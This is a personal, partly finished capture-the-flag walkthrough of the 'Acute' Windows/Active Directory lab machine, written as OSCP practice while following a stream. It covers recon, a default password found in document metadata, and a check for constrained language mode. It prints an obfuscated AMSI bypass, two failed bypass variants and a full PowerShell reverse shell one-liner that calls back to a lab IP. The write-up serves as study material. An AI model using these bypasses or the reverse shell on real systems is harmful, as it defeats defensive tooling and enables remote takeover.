# Acute Helped-Through

Name: Acute
Date:  
Difficulty: Hard  
Goals:  OSCP prep and rebuild alot of lost momentuum before December
Learnt:
- Virtual host rounting - in `/etc/hosts subdomain.domain.tld subdomain`
- Question how service running on server to host the external service?
- Be throughout - 2/4 - I wanted to test links to much! - Extract all and Test Linearly - Extract and Test.

Had a pretty terrible couple of days, awhile still being healthy and solved some more administrative issues. No boxes were done and I am returningto power through the next exam like 12 hours brutality fun-time-fail-and-fix. One day in one day off. I need a good five hours of fun and practical learning and recall. These streams are great for that as Al is always either two steps ahead of me or I am ahead by a step whiel he is using the other half of his brain to throw out questions, testing the audience and answering questions about relevant cyber security questions.
[Alh4zr3d](https://www.youtube.com/watch?v=IRSm7kalGPY) stream and after following along I will read 0xDF writeup on this and another from another source.

If I ever am fortunate enough to be a part of a group people hacking away I am definite wqant to bring this kind of style - with less noisey and shouty American(I like it but I dont think in the same room as other it would work as well) and more Ed Skoudis or Marcus Hutchins(although with more exciting than calm) though. How can ever burnout with a group learning and doing stuff together. Edit he pulls a Bob Ross on the stream so my comments here somewhat muted.

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

My inital masscan failed so all more my automated recon goes full manual till I get port information regardless of knowing that this is AD machine. I the time it takes to recon a machine should bear some realism helpful while sort out a couple issues remaining before I start watching the stream. Nmap finishes while I am prepping myself - it is just a website. 

![](dnsbutno53.png)

`atsserver.acute.local`, therefore add to /etc/hosts and subdomain brute force and double check DNS and Kerberos as .local is not local network .tld used in AD. which is weird. Stating the tought process to state it as the reason not that I know it is an AD box. After I had finish scanning and the extra checks my first thought while Al preps  the box and stream I remember read a ssl cert tool bug bounty hunters use - found it in my Automated Recon setup for Bug Bounty - the Osint part is legitimately almost done, my rust part no where near done, but my bash automation is good enough, the subdomain bruteforce willl not take long. 

Nuclei:
[IIS 10](microsoft-iis-version-https___atsserver.acute.local) 

Burp:

Acute/ - directory structuring
Userson about page
Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins.

New starter forms
![](noonenewcanstartatacute.png)

Intel from inside the document
![](insidedocone.png)
https://atsserver.acute.local/Staff/Induction - 404
https://atsserver.acute.local/Staff - 404
Also:
https://atsserver.acute.local/Acute_Staff_Access

![](remoteaccess.png)

This disclosure narrows a possible route to escalate.
![](Loisisthetarget.png)

Exiftooling docments is must to etch into my brain
![](exiftool.png)


- Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage.

![](defaultpass.png)

AD-CS is involved in 
![](ucard-adcs.png)

Be throughout! - Missed the Password and PSWA intel - `Password1!`

![](loginexiftoolrequired.png)

EDavies is the holder of the fine default password `Password1!`

![](pswainit.png)

Contrained language mode enumeration - Constrain users to core type, prevent all the good powershell.
```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage == Good 
```

Most recent versions of Windows **DOES NOT HAVE POWERSHELL v2**

![](amsibypasscheck.png)

The  bypass Al used threw this error
![](thisbypassfailed.png)

If patched, just change up the strings/variables. https://github.com/sinfulz/JustEvadeBro

```powershell
# Enumerate AMSI
$str = 'amsiinitfailed'
# Bypass with:
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
# Check AMSI
$str = 'amsiinitfailed'
```

Tried these and failed:
```powershell
# Failed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Failed
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

![](amsibypassmyself.png)

Weird directory pointed out be a member of the stream:
![](weirdutilsdirectoranddeskopini.png)

Why is this there, my eyelids have icacls.exe icacls.exe under each. 
![](icalcstheutils.png)


```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![](runningontotherevshell.png)

```powershell
get-process 
# What is weird - Our Context - PS
explorer
msedge
WmiPrvSE
# The above indicate interactive logon sessions
```

![](getcomputerinfo.png)

Check for remote desktop users
![](qwinstaWIN.png)

Feels good to know about `set`, but not good to not 2 is 1 the box... Learnt `dir env:`
![](direnv.png)
Then my LOLSBAS started failing... 
Given the `hostname` is `Acute-PC01` and the DC = `\\ATSSERVER`, which is the logon server, *but* becuase we have no external DC ports we must be in some kind of virtual environment.

## Exploit

## Foothold

## PrivEsc

      
